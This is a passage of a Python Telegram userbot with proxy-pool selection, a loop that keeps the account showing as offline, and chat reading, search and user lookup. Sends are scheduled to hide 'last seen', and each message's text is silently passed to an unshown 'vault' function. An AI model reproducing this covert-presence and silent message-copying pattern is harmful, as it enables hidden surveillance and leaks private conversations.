        success(f"✓ {cname}: {active_cnt}/{len(proxies)} ACTIVE proxies verified (saved to {fpath})")
        if active_states:
            st_str = ", ".join(f"{st} ({cnt})" for st, cnt in active_states.most_common(5))
            print(col(f"    Top states: {st_str}", Fore.WHITE + Style.DIM))
        print()

    success("All proxy pools have been upgraded with current active/dead statuses!")

def prompt_custom_proxy():
    print()
    print(col("  1. SOCKS5   2. SOCKS4   3. HTTP", Fore.WHITE))
    proto_c = prompt("Proxy Type (1/2/3)")
    proto = {"1": "socks5", "2": "socks4", "3": "http"}.get(proto_c, "socks5")
    host = prompt("Host (IP or domain)")
    if not host:
        warn("Host required — defaulting to direct connection."); return {"enabled": False}
    port_s = prompt("Port")
    if not port_s.isdigit():
        warn("Port must be numeric — defaulting to direct connection."); return {"enabled": False}
    user = prompt("Username (Enter to skip)")
    pw = prompt("Password (Enter to skip)") if user else ""
    custom_p = {
        "enabled": True,
        "type": proto,
        "host": host,
        "port": int(port_s),
        "state": "Custom",
        "city": "Manual",
    }
    if user: custom_p["username"] = user
    if pw: custom_p["password"] = pw
    success(f"Custom {proto.upper()} proxy configured!")
    return custom_p

async def choose_proxy_for_account():
    clear()
    header("PROXY CONFIGURATION FOR THIS ACCOUNT")
    print(col("  Do you want to use a proxy for this account?\n", Fore.CYAN + Style.BRIGHT))
    print(col("  1.  Yes — Select a Proxy  (Country ➔ State ➔ Active Proxies)", Fore.GREEN + Style.BRIGHT))
    print(col("  2.  No  — Connect Directly  (Real IP / No Proxy)", Fore.WHITE))
    print(col("  3.  ✍️   Enter Custom Proxy Manually", Fore.WHITE))
    print(col("  4.  🌐  Inherit Global Proxy Setting (from proxy.json)", Fore.WHITE))
    print()
    ch = prompt("Choice (1-4)").strip()

    if ch == "2":
        info("Direct connection selected (No proxy for this account).")
        return {"enabled": False}
    elif ch == "3":
        return prompt_custom_proxy()
    elif ch == "4":
        info("Using global proxy setting.")
        return None
    elif ch != "1":
        info("Defaulting to direct connection.")
        return {"enabled": False}

    countries = list_proxy_countries()
    if not countries:
        warn(f"No proxy files found in '{PROXY_DIR}/' directory.")
        return None

    # Step A: Choose Country
    chosen_country_info = None
    while True:
        clear()
        header("STEP 1: SELECT PROXY COUNTRY")
        print(col("  Available Countries:\n", Fore.CYAN))
        for i, c in enumerate(countries):
            act = c.get("active_count", 0)
            tot = c.get("count", 0)
            cname = c.get("country", "")
            print(f"  [{col(f'{i+1:>2}', Fore.CYAN)}]  {col(f'{cname:<24}', Fore.WHITE)} {col(f'({act} active / {tot} total)', Fore.GREEN if act > 0 else Fore.YELLOW)}")
        print()
        print(col("  [ 0 ]  Skip proxy (Direct connection)", Fore.WHITE + Style.DIM))
        c_choice = prompt(f"Select Country (1-{len(countries)}, 0 to skip)").strip()

        if c_choice == "0":
            return {"enabled": False}
        try:
            c_idx = int(c_choice)
            if 1 <= c_idx <= len(countries):
                chosen_country_info = countries[c_idx - 1]
                break
            else:
                error("Invalid selection!"); press_enter()
        except ValueError:
            error("Invalid input!"); press_enter()

    # Step B: Choose State (filter for active proxies, exclude Bihar)
    country_file = chosen_country_info["file"]
    cname = chosen_country_info["country"]
    proxies = load_country_proxies(country_file)

    if "india" in cname.lower():
        proxies = [p for p in proxies if p.get("state", "").lower() != "bihar" and p.get("city", "").lower() != "bhagalpur"]

    # Filter for ONLY ACTIVE proxies
    active_proxies = [p for p in proxies if p.get("status") == "active"]

    if not active_proxies:
        warn(f"No proxies currently marked active in {cname}!")
        print(col("  Would you like to auto-test all proxies in this country now? (y/n)", Fore.YELLOW))
        if prompt("Choice").lower() == "y":
            proxies, act_cnt = await benchmark_proxies_list(proxies, cname)
            save_country_proxies(country_file, proxies)
            active_proxies = [p for p in proxies if p.get("status") == "active"]

    if not active_proxies:
        error(f"No active proxies available for {cname} at this moment.")
        press_enter()
        return {"enabled": False}

    from collections import defaultdict
    state_map = defaultdict(list)
    for p in active_proxies:
        st = p.get("state") or "Other"
        state_map[st].append(p)

    states = sorted(state_map.keys(), key=lambda s: (-len(state_map[s]), s))

    chosen_state = None
    while True:
        clear()
        header(f"STEP 2: SELECT STATE  —  {cname.upper()}")
        print(col(f"  Available States in {cname} with Active Proxies:\n", Fore.CYAN))
        for i, st in enumerate(states):
            cnt = len(state_map[st])
            print(f"  [{col(f'{i+1:>2}', Fore.CYAN)}]  {col(f'{st:<26}', Fore.WHITE)} {col(f'({cnt} active proxies)', Fore.GREEN)}")
        print()
        print(col("  [ T ]  ⚡ Benchmark / Re-test All Proxies in this Country", Fore.YELLOW + Style.BRIGHT))
        print(col("  [ B ]  Back to Country Selection", Fore.WHITE + Style.DIM))
        print(col("  [ 0 ]  Skip proxy (Direct connection)", Fore.WHITE + Style.DIM))

        s_choice = prompt(f"Select State (1-{len(states)}, T to test, B for back)").strip().lower()
        if s_choice == "0":
            return {"enabled": False}
        if s_choice == "b":
            return await choose_proxy_for_account()
        if s_choice == "t":
            proxies, act_cnt = await benchmark_proxies_list(proxies, cname)
            save_country_proxies(country_file, proxies)
            active_proxies = [p for p in proxies if p.get("status") == "active"]
            state_map = defaultdict(list)
            for p in active_proxies:
                state_map[p.get("state") or "Other"].append(p)
            states = sorted(state_map.keys(), key=lambda s: (-len(state_map[s]), s))
            success(f"Benchmark finished! {act_cnt} proxies are ACTIVE.")
            press_enter()
            continue

        try:
            s_idx = int(s_choice)
            if 1 <= s_idx <= len(states):
                chosen_state = states[s_idx - 1]
                break
            else:
                error("Invalid selection!"); press_enter()
        except ValueError:
            error("Invalid input!"); press_enter()

    # Step C: Select Specific Active Proxy within chosen State
    state_proxies = state_map[chosen_state]

    while True:
        clear()
        header(f"STEP 3: ACTIVE PROXIES IN {chosen_state.upper()} ({cname})")
        print(col(f"  Showing ONLY ACTIVE verified proxies in {chosen_state}:\n", Fore.CYAN))

        display_limit = min(len(state_proxies), 25)
        for i in range(display_limit):
            p = state_proxies[i]
            idx_str = f"{i + 1:>2}"
            ct = p.get("city", "")
            ptype = p.get("type", "socks5").upper()
            host_port = f"{p.get('host')}:{p.get('port')}"
            lat = p.get("latency_ms", "?")
            lat_str = f"{lat}ms" if isinstance(lat, int) and lat < 9000 else "OK"

            line = f"  [{col(idx_str, Fore.CYAN)}]  {col(f'{ct:<16}', Fore.WHITE)} {col(f'{ptype:<6}', Fore.YELLOW)} {col(f'{host_port:<22}', Fore.CYAN)} {col(f'⚡ {lat_str:<8}', Fore.GREEN)} {col('ACTIVE ✓', Fore.GREEN)}"
            print(line)

        if len(state_proxies) > display_limit:
            print(col(f"\n  … and {len(state_proxies) - display_limit} more active proxies in this state.", Fore.WHITE + Style.DIM))

        print()
        print(col("  [ T ]  ⚡ Re-test Proxies in this State", Fore.YELLOW + Style.BRIGHT))
        print(col("  [ B ]  Back to State selection", Fore.WHITE + Style.DIM))

        p_choice = prompt(f"Select proxy (1-{display_limit}, T to test, B for back)").strip().lower()

        if p_choice == "b":
            return await choose_proxy_for_account()
        elif p_choice == "t":
            state_proxies, act = await benchmark_proxies_list(state_proxies, f"{chosen_state}, {cname}")
            state_proxies = [p for p in state_proxies if p.get("status") == "active"]
            state_map[chosen_state] = state_proxies
            success("Tested state proxies!")
            press_enter()
            continue
        else:
            try:
                num = int(p_choice)
                if 1 <= num <= display_limit:
                    sel = state_proxies[num - 1]
                    p_info = {
                        "enabled": True,
                        "type": sel.get("type", "socks5"),
                        "host": sel.get("host"),
                        "port": int(sel.get("port")),
                        "state": chosen_state,
                        "city": sel.get("city", ""),
                        "country": cname
                    }
                    success(f"Proxy selected: [{chosen_state}, {sel.get('city')}] {sel.get('type').upper()} {sel.get('host')}:{sel.get('port')}")
                    return p_info
                else:
                    error(f"Invalid option! Pick 1 to {display_limit}"); press_enter()
            except ValueError:
                error("Invalid input!"); press_enter()

async def _reconnect_account_client(account_name, config, client):
    info("Reconnecting client with new proxy settings…")
    try:
        await go_offline(client)
        await client.disconnect()
    except Exception:
        pass
    try:
        new_client = await connect_client(
            StringSession(config.get("client_token") or config.get("session_string", "")),
            config["api_id"],
            config["api_hash"],
            account_config=config,
        )
        success("Client reconnected successfully ✓")
        return new_client
    except Exception as e:
        error(f"Reconnection error: {e}")
        return client

async def feat_manage_account_proxy(account_name, config, all_accounts, client=None):
    clear()
    header(f"PROXY MANAGER  —  ACCOUNT: {account_name}")
    current_lbl = proxy_label(config)
    print(col(f"  Current Account: {account_name}", Fore.WHITE + Style.BRIGHT))
    print(col(f"  Active Proxy:    {current_lbl}\n", Fore.CYAN + Style.BRIGHT))

    print(col("  1.  ⚡ Change Proxy  (Country ➔ State ➔ Active Proxies)", Fore.GREEN + Style.BRIGHT))
    print(col("  2.  🚫 Disable Proxy  (Switch to Direct Connection / Real IP)", Fore.YELLOW + Style.BRIGHT))
    print(col("  3.  🔄 Test Live Speed of Current Proxy", Fore.WHITE))
    print(col("  4.  ✍️   Enter Custom Proxy Manually", Fore.WHITE))
    print(col("  5.  🌐  Inherit Global Proxy Setting (from proxy.json)", Fore.WHITE))
    print(col("  6.  Back", Fore.WHITE + Style.DIM))
    print()
    ch = prompt("Choose option (1-6)").strip()

    reconnected_client = None

    if ch == "1":
        new_proxy = await choose_proxy_for_account()
        if new_proxy is not None:
            all_accounts[account_name]["proxy"] = new_proxy
            config["proxy"] = new_proxy
            save_accounts(all_accounts)
            success(f"Proxy updated for '{account_name}' to: {proxy_label(config)}")
            if client:
                reconnected_client = await _reconnect_account_client(account_name, config, client)
        press_enter()

    elif ch == "2":
        all_accounts[account_name]["proxy"] = {"enabled": False}
        config["proxy"] = {"enabled": False}
        save_accounts(all_accounts)
        warn(f"Proxy disabled for '{account_name}'! Account will now connect directly.")
        if client:
            reconnected_client = await _reconnect_account_client(account_name, config, client)
        press_enter()

    elif ch == "3":
        pcfg = resolve_proxy(config)
        if not pcfg.get("enabled"):
            info("Account is currently using Direct Connection (No proxy to test).")
        else:
            info(f"Pinging {pcfg.get('type','').upper()}://{pcfg.get('host')}:{pcfg.get('port')} to Telegram DC4…")
            loop = asyncio.get_running_loop()
            alive, lat = await loop.run_in_executor(None, test_proxy_sync, pcfg)
            if alive:
                success(f"Proxy is ACTIVE! Live latency: {lat}ms ✓")
            else:
                error("Proxy connection TIMED OUT or is OFFLINE! ✗")
        press_enter()

    elif ch == "4":
        custom_p = prompt_custom_proxy()
        if custom_p:
            all_accounts[account_name]["proxy"] = custom_p
            config["proxy"] = custom_p
            save_accounts(all_accounts)
            success(f"Custom proxy saved for '{account_name}': {proxy_label(config)}")
            if client:
                reconnected_client = await _reconnect_account_client(account_name, config, client)
        press_enter()

    elif ch == "5":
        if "proxy" in all_accounts[account_name]:
            del all_accounts[account_name]["proxy"]
        if "proxy" in config:
            del config["proxy"]
        save_accounts(all_accounts)
        success(f"'{account_name}' will now inherit the global proxy setting: {proxy_label(config)}")
        if client:
            reconnected_client = await _reconnect_account_client(account_name, config, client)
        press_enter()

    return reconnected_client

async def setup_proxy():
    clear()
    header("PROXY  /  STEALTH ROUTING")
    pcfg = load_proxy()
    if pcfg.get("enabled"):
        info(f"Active global proxy:  {proxy_label()}")
    else:
        warn("No proxy set — Telegram sees your real IP!")

    print()
    print(col("  1.  SOCKS5    (most VPN apps / SSH tunnels)", Fore.WHITE))
    print(col("  2.  SOCKS4",                                  Fore.WHITE))
    print(col("  3.  HTTP proxy",                              Fore.WHITE))
    print(col("  4.  MTProto   (Telegram native — no PySocks)", Fore.WHITE))
    print(col("  5.  ⚡ Select Global Proxy from Pool (Country ➔ State ➔ Active)", Fore.GREEN + Style.BRIGHT))
    print(col("  6.  🔄 Benchmark All Proxies (Verify Active/Dead)", Fore.YELLOW + Style.BRIGHT))
    print(col("  7.  👥 Manage / Disable Proxy for a Specific Account", Fore.CYAN + Style.BRIGHT))
    print(col("  8.  Disable global proxy",                    Fore.RED + Style.DIM))
    print(col("  9.  Back",                                    Fore.WHITE + Style.DIM))
    choice = prompt("Choose")

    if choice in ("1", "2", "3"):
        ptype  = {"1": "socks5", "2": "socks4", "3": "http"}[choice]
        host   = prompt("Host  (IP or domain)")
        if not host:
            error("Host is required!"); press_enter(); return
        port_s = prompt("Port")
        if not port_s.isdigit():
            error("Port must be a number!"); press_enter(); return
        user = prompt("Username  (Enter to skip)")
        pw   = prompt("Password  (Enter to skip)") if user else ""
        save_proxy({"enabled": True, "type": ptype, "host": host,
                    "port": int(port_s), "username": user, "password": pw})
        success(f"{ptype.upper()} proxy saved!")
        press_enter()
    elif choice == "4":
        host   = prompt("MTProto host")
        if not host:
            error("Host is required!"); press_enter(); return
        port_s = prompt("Port")
        if not port_s.isdigit():
            error("Port must be a number!"); press_enter(); return
        secret = prompt("Secret  (hex string, starts with  dd…)")
        if not secret:
            error("Secret is required!"); press_enter(); return
        save_proxy({"enabled": True, "type": "mtproto", "host": host,
                    "port": int(port_s), "secret": secret})
        success("MTProto proxy saved!")
        press_enter()
    elif choice == "5":
        chosen = await choose_proxy_for_account()
        if chosen and chosen.get("enabled"):
            save_proxy(chosen)
            success(f"Global proxy set to {proxy_label(chosen)}!")
        press_enter()
    elif choice == "6":
        await benchmark_all_country_proxies()
        press_enter()
    elif choice == "7":
        accs = load_accounts()
        if not accs:
            warn("No accounts saved yet!"); press_enter()
        else:
            names = list(accs.keys())
            clear()
            header("SELECT ACCOUNT TO MANAGE PROXY")
            print()
            for i, n in enumerate(names):
                print(col(f"  {i:>2}.  {n:<14} [{proxy_label(accs[n])}]", Fore.WHITE))
            print()
            pick_acc = prompt(f"Select account (0-{len(names)-1})").strip()
            if pick_acc.isdigit() and 0 <= int(pick_acc) < len(names):
                target_name = names[int(pick_acc)]
                await feat_manage_account_proxy(target_name, accs[target_name], accs)
            else:
                error("Invalid selection!"); press_enter()
    elif choice == "8":
        save_proxy({"enabled": False})
        warn("Proxy disabled — your real IP is now visible to Telegram.")
        press_enter()
    elif choice == "9":
        return


# ═══════════════════════════════════════════════════════════════
#  STEALTH CORE
# ═══════════════════════════════════════════════════════════════

async def get_public_ip():
    loop = asyncio.get_running_loop()
    try:
        ip = await loop.run_in_executor(
            None,
            lambda: urllib.request.urlopen(
                "https://api.ipify.org", timeout=4
            ).read().decode()
        )
        return ip.strip()
    except Exception:
        return "unavailable"

async def go_offline(client):
    try:
        await client(UpdateStatusRequest(offline=True))
    except Exception:
        pass

async def keepalive_loop(client):
    while True:
        await go_offline(client)
        await asyncio.sleep(KEEPALIVE_SEC)


# ═══════════════════════════════════════════════════════════════
#  DIALOG HELPERS
# ═══════════════════════════════════════════════════════════════

async def fetch_dialogs(client, limit=100):
    return await client.get_dialogs(limit=limit)

def dialog_fmt(accent):
    def _fmt(idx, d):
        unread  = col(f" [{d.unread_count}]", Fore.RED) if d.unread_count else ""
        preview = ""
        if d.message and d.message.text:
            preview = col("   " + trunc(d.message.text.replace("\n", " "), 38),
                          Style.DIM + Fore.WHITE)
        return f"  {col(f'{idx:>3}', accent)}.  {col(d.name or 'Unknown', Fore.WHITE)}{unread}{preview}"
    return _fmt

async def pick_dialog(client, accent, cached=None):
    if cached is None:
        lim = prompt("How many chats to load?  (default 100)")
        lim = int(lim) if lim.isdigit() else 100
        info("Loading chats…")
        cached = await fetch_dialogs(client, lim)
        await go_offline(client)
    idx = show_page(cached, formatter=dialog_fmt(accent))
    if idx is None:
        return None, cached
    return cached[idx], cached


# ═══════════════════════════════════════════════════════════════
#  MESSAGE RENDERER
# ═══════════════════════════════════════════════════════════════

async def get_sender_name(client, msg):
    if msg.out:
        return col("📤 You", Fore.GREEN)
    try:
        s = await msg.get_sender()
        if s:
            full = f"{getattr(s,'first_name','') or ''} {getattr(s,'last_name','') or ''}".strip()
            full = full or getattr(s, "title", "Unknown")
            return col(f"📥 {full}", Fore.BLUE)
    except Exception:
        pass
    return col("📥 Unknown", Fore.BLUE)

async def render_msg(client, msg):
    sndr = await get_sender_name(client, msg)
    date = to_ist(msg.date)

    if msg.reply_to_msg_id:
        reply_txt = "unknown"
        try:
            r_msg = await msg.get_reply_message()
            if r_msg:
                if r_msg.text:
                    reply_txt = r_msg.text.replace("\n", " ").strip()[:40]
                    if len(r_msg.text) > 40: reply_txt += "..."
                elif getattr(r_msg, 'media', None):
                    media_type = type(r_msg.media).__name__.replace('MessageMedia', '')
                    reply_txt = f"[{media_type}]"
        except Exception:
            pass
        print(col(f"    ↩  [replied to: {reply_txt}]", Style.DIM + Fore.CYAN))
    elif msg.reply_to:
        print(col("    ↩  [reply]", Style.DIM + Fore.CYAN))
    print(col(f"  [{date}]  {sndr}:", Style.BRIGHT + Fore.WHITE))

    if msg.fwd_from:
        try:
            orig = msg.fwd_from.from_name
            if not orig and msg.fwd_from.from_id:
                ent  = await client.get_entity(msg.fwd_from.from_id)
                orig = getattr(ent, "first_name", None) or getattr(ent, "title", None)
            orig = orig or "Unknown"
            print(col(f"    🔄 Fwd from {orig}  [{to_ist(msg.fwd_from.date)}]", Fore.MAGENTA))
        except Exception:
            pass

    if msg.text:
        for line in msg.text.split("\n"):
            print(f"    {line}")

    if msg.media:
        icons = {
            "MessageMediaPhoto":    "🖼️   Photo",
            "MessageMediaDocument": "📎  File",
            "MessageMediaPoll":     "📊  Poll",
            "MessageMediaWebPage":  "🌐  Link preview",
            "MessageMediaGeo":      "📍  Location",
            "MessageMediaContact":  "👤  Contact",
            "MessageMediaVenue":    "🏛️   Venue",
        }
        label = icons.get(type(msg.media).__name__, f"📦  {type(msg.media).__name__}")
        print(col(f"    {label}", Fore.YELLOW))

        if hasattr(msg.media, "poll"):
            poll    = msg.media.poll
            results = msg.media.results
            q_text  = poll.question.text if hasattr(poll.question, "text") else str(poll.question)
            print(col(f"    Q: {q_text}", Fore.WHITE))
            if results and results.results:
                for ans, res in zip(poll.answers, results.results):
                    voters = res.voters or 0
                    bar    = "█" * min(voters, 20)
                    a_text = ans.text.text if hasattr(ans.text, "text") else str(ans.text)
                    print(col(f"      {a_text}: {voters}  {bar}", Fore.CYAN))

        if msg.message:
            print(col(f"    Caption: {msg.message}", Style.DIM))

    if msg.reactions:
        try:
            parts = [
                f"{getattr(r.reaction,'emoticon','?')}×{r.count}"
                for r in msg.reactions.results
            ]
            if parts:
                print(col(f"    {' '.join(parts)}", Fore.YELLOW))
        except Exception:
            pass
    print()


# ═══════════════════════════════════════════════════════════════
#  FEATURES — READ
# ═══════════════════════════════════════════════════════════════

async def feat_list(client, accent):
    """1. List All Chats — stays open, reload or pick new limit."""
    dialogs = None
    while True:
        clear()
        header("ALL CHATS")
        lim     = prompt("How many chats?  (default 100)")
        lim     = int(lim) if lim.isdigit() else 100
        info("Loading…")
        dialogs = await fetch_dialogs(client, lim)
        await go_offline(client)

        total_unread = sum(d.unread_count for d in dialogs if d.unread_count)
        if total_unread:
            warn(f"{total_unread} unread  across  "
                 f"{sum(1 for d in dialogs if d.unread_count)} chats")

        show_page(dialogs, formatter=dialog_fmt(accent))

        nxt = again_menu("Reload with different limit")
        if nxt is None:
            return


async def feat_read(client, accent):
    """2. Read Messages — loop: read same chat again or pick another."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("READ MESSAGES")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        n = prompt(f"How many messages from  [{selected.name}]?  (default 30)")
        n = int(n) if n.isdigit() else 30

        info("Loading messages…")
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)

        clear()
        header(f"💬  {selected.name}")
        print()
        for m in reversed(msgs):
            await render_msg(client, m)
            divider()
        await go_offline(client)

        nxt = again_menu(
            f"Read more from  [{selected.name}]",
            "Pick a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_search_chat(client, accent):
    """3. Search Within Chat — stay in same chat or switch."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SEARCH WITHIN CHAT")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        q = prompt(f"Keyword to search in  [{selected.name}]")
        if not q:
            error("Keyword cannot be empty!"); press_enter(); continue

        info(f"Searching '{q}' in {selected.name}…")
        msgs = await client.get_messages(selected.entity, search=q, limit=50)
        await go_offline(client)

        if not msgs:
            error("No results found!"); press_enter()
        else:
            clear()
            header(f"🔍  '{q}'  in  {selected.name}")
            print()
            for m in reversed(msgs):
                await render_msg(client, m)
                divider()
            await go_offline(client)

        nxt = again_menu(
            f"Search new keyword in  [{selected.name}]",
            "Search in a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_search_global(client):
    """4. Global Search — loop: search another keyword."""
    while True:
        clear()
        header("GLOBAL SEARCH")
        q = prompt("Keyword to search across ALL chats")
        if not q:
            error("Keyword cannot be empty!"); press_enter(); continue

        info("Searching across all chats…")
        msgs = await client.get_messages(None, search=q, limit=50)
        await go_offline(client)

        if not msgs:
            error("No results found!"); press_enter()
        else:
            clear()
            header(f"🔍  Global — '{q}'  ({len(msgs)} results)")
            print()
            for m in msgs:
                try:
                    chat      = await m.get_chat()
                    chat_name = getattr(chat, "title", None) or getattr(chat, "first_name", "?")
                    print(col(f"  📌 [{chat_name}]", Fore.MAGENTA))
                except Exception:
                    pass
                await render_msg(client, m)
                divider()
            await go_offline(client)

        nxt = again_menu("Search a new keyword")
        if nxt is None:
            return


async def feat_search_date(client, accent):
    """5. Search by Date Range — loop: new range same chat or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SEARCH BY DATE RANGE  (IST)")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        from_s = prompt("From   DD/MM/YYYY")
        to_s   = prompt("To     DD/MM/YYYY")
        try:
            from_dt = datetime.strptime(from_s, "%d/%m/%Y").replace(tzinfo=IST).astimezone(timezone.utc)
            to_dt   = datetime.strptime(to_s,   "%d/%m/%Y").replace(tzinfo=IST).astimezone(timezone.utc)
        except ValueError:
            error("Invalid date — use DD/MM/YYYY"); press_enter(); continue

        info("Loading messages in range…")
        msgs = []
        async for m in client.iter_messages(
            selected.entity, offset_date=to_dt, reverse=False, limit=500
        ):
            m_dt = m.date if m.date.tzinfo else m.date.replace(tzinfo=timezone.utc)
            if m_dt < from_dt:
                break
            msgs.append(m)
        await go_offline(client)

        if not msgs:
            error("No messages in that date range!"); press_enter()
        else:
            clear()
            header(f"📅  {selected.name}   {from_s} → {to_s}  ({len(msgs)} msgs)")
            print()
            for m in reversed(msgs[:100]):
                await render_msg(client, m)
                divider()
            await go_offline(client)

        nxt = again_menu(
            f"New date range in  [{selected.name}]",
            "Pick a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


MEDIA_TYPES = [
    ("1", "Photos",    InputMessagesFilterPhotos()),
    ("2", "Documents", InputMessagesFilterDocument()),
    ("3", "Voice",     InputMessagesFilterVoice()),
    ("4", "Videos",    InputMessagesFilterVideo()),
]

async def feat_search_media(client, accent):
    """6. Search by Media Type — loop: different type or different chat."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SEARCH BY MEDIA TYPE")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        print()
        print(col(f"  Chat:  [{selected.name}]", Fore.CYAN))
        print()
        for t in MEDIA_TYPES:
            print(col(f"  {t[0]}.  {t[1]}", Fore.WHITE))
        choice = prompt("Choose type")
        entry  = next((t for t in MEDIA_TYPES if t[0] == choice), None)
        if not entry:
            error("Invalid choice — enter 1 to 4"); press_enter(); continue

        info(f"Loading {entry[1]} in {selected.name}…")
        msgs = await client.get_messages(selected.entity, filter=entry[2], limit=50)
        await go_offline(client)

        if not msgs:
            error("No media found!"); press_enter()
        else:
            clear()
            header(f"🎞   {selected.name}  —  {entry[1]}  ({len(msgs)} items)")
            print()
            for m in reversed(msgs):
                await render_msg(client, m)
                divider()
            await go_offline(client)

        nxt = again_menu(
            f"Different media type in  [{selected.name}]",
            "Pick a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_pinned(client, accent):
    """7. Pinned Messages — loop: view another chat."""
    while True:
        clear()
        header("PINNED MESSAGES")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        info("Loading pinned messages…")
        try:
            msgs = await client.get_messages(
                selected.entity, filter=InputMessagesFilterPinned(), limit=20
            )
        except Exception:
            msgs = []
        await go_offline(client)

        if not msgs:
            error("No pinned messages found!"); press_enter()
        else:
            clear()
            header(f"📌  Pinned  —  {selected.name}  ({len(msgs)} pinned)")
            print()
            for m in msgs:
                await render_msg(client, m)
                divider()
            await go_offline(client)

        nxt = again_menu("View pinned in another chat")
        if nxt is None:
            return


async def feat_chat_info(client, accent):
    """8. Chat / Group Info — loop: view another."""
    while True:
        clear()
        header("CHAT / GROUP INFO")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        entity = selected.entity
        clear()
        header(f"ℹ️   {selected.name}")

        try:
            if hasattr(entity, "megagroup") or hasattr(entity, "broadcast"):
                full      = await client(GetFullChannelRequest(entity))
                chat      = full.chats[0]
                full_chat = full.full_chat
                rows = [
                    ("Title",    chat.title),
                    ("Username", f"@{getattr(chat,'username','N/A') or 'N/A'}"),
                    ("Members",  getattr(full_chat, "participants_count", "N/A")),
                    ("Type",     "Channel" if getattr(chat, "broadcast", False) else "Group"),
                    ("About",    trunc(getattr(full_chat, "about", "—") or "—", 80)),
                ]
                if getattr(full_chat, "invite_link", None):
                    rows.append(("Invite", full_chat.invite_link))
            else:
                full      = await client(GetFullUserRequest(entity))
                user      = full.users[0]
                full_user = full.full_user
                name = f"{getattr(user,'first_name','') or ''} {getattr(user,'last_name','') or ''}".strip()
                rows = [
                    ("Name",     name),
                    ("Username", f"@{getattr(user,'username','N/A') or 'N/A'}"),
                    ("Phone",    getattr(user, "phone", "N/A") or "N/A"),
                    ("Bio",      trunc(getattr(full_user, "about", "—") or "—", 80)),
                    ("Verified", str(getattr(user, "verified", False))),
                ]

            await go_offline(client)
            print()
            label_w = max(len(r[0]) for r in rows) + 2
            for label, value in rows:
                print(f"  {col(label.ljust(label_w), Fore.CYAN)} {value}")

        except Exception as e:
            error(f"Could not fetch info: {e}")

        await go_offline(client)

        nxt = again_menu("View info for another chat / user")
        if nxt is None:
            return


async def feat_mutual(client):
    """9. Mutual Groups — loop: check another user."""
    while True:
        clear()
        header("MUTUAL GROUPS")
        username = prompt("@username  /  +phone  /  user ID")
        if not username:
            return
        try:
            target = await client.get_entity(username)
            result = await client(GetCommonChatsRequest(user_id=target, max_id=0, limit=100))
            await go_offline(client)
            if not result.chats:
                error("No mutual groups found!")
            else:
                success(f"{len(result.chats)} mutual group(s):")
                for g in result.chats:
                    print(col(f"    • {g.title}", Fore.WHITE))
        except Exception as e:
            error(f"Error: {e}")
        await go_offline(client)

        nxt = again_menu("Check mutual groups for another user")
        if nxt is None:
            return


# ═══════════════════════════════════════════════════════════════
#  FEATURES — SEND
# ═══════════════════════════════════════════════════════════════

async def feat_send(client, accent):
    """10. Send Message — loop: send to same chat again or pick another."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("SEND MESSAGE  👻")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        print(col(f"\n  To:  [{selected.name}]", Fore.CYAN + Style.BRIGHT))
        text = prompt("Message text  (blank = cancel this send)")
        if not text:
            warn("Send cancelled.")
        else:
            send_at     = auto_schedule()
            send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
            try:
                await go_offline(client)
                await client.send_message(selected.entity, text, schedule=send_at)
                await go_offline(client)
                success(f"Queued!  Sends at  {send_at_ist} IST   👻 Last seen untouched!")
                audit_card = (
                    f"📤 <b>OUTGOING MESSAGE DISPATCHED</b>\n"
                    f"────────────────────────\n"
                    f"💬 <b>Destination:</b> {html.escape(selected.name)}\n"
                    f"⏱️ <b>Scheduled Delivery:</b> <code>{send_at_ist} IST</code>\n"
                    f"📝 <b>Payload:</b>\n<blockquote>{html.escape(text)}</blockquote>"
                )
                asyncio.create_task(dispatch_vault_event(audit_card, silent=True))
            except Exception as e:
                error(f"Failed: {e}")

        nxt = again_menu(
            f"Send another to  [{selected.name}]",
            "Send to a different chat",
        )
        if nxt is None:
            return
        elif "different" in nxt:
            selected = None


async def feat_reply(client, accent):
    """11. Reply to Message — loop: reply again in same chat or switch."""
    selected = None
    dialogs  = None
    while True:
        clear()
        header("REPLY TO MESSAGE  👻")
        if selected is None:
            selected, dialogs = await pick_dialog(client, accent)
            if not selected:
                return

        n    = prompt(f"Load how many messages from  [{selected.name}]?  (default 20)")
        n    = int(n) if n.isdigit() else 20
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)
        if not msgs:
            error("No messages found in this chat!"); press_enter(); continue

        clear()
        header(f"💬  {selected.name}  —  pick message to reply")
        mlist = list(reversed(msgs))
        for i, m in enumerate(mlist):
            sndr = "You" if m.out else selected.name
            txt  = trunc(m.text or "[media]", 60)
            print(col(f"  {i:>3}.  [{to_ist(m.date)}]  {sndr}:", Fore.WHITE)
                  + col(f"  {txt}", Style.DIM))

        try:
            target = mlist[int(prompt("Reply to message number"))]
        except (ValueError, IndexError):
            error("Invalid number!"); press_enter(); continue

        print(col("\n  What do you want to reply with?", Fore.CYAN))
        print(col("  1. Text Only", Fore.WHITE))
        print(col("  2. File / Folder Only", Fore.WHITE))
        print(col("  3. Combined (Text + File)", Fore.WHITE))
        
        s_choice = prompt("Choose an option")
        if s_choice not in ["1", "2", "3"]:
            warn("Cancelled.")
            continue
            
        reply_text = None
        if s_choice in ["1", "3"]:
            reply_text = prompt("Your reply text")
            if not reply_text and s_choice == "1":
                warn("Cancelled.")
                continue
                
        paths = []
        if s_choice in ["2", "3"]:
            print(col("  Type or drag-and-drop file paths. Type 'done' when finished.", Fore.CYAN))
            while True:
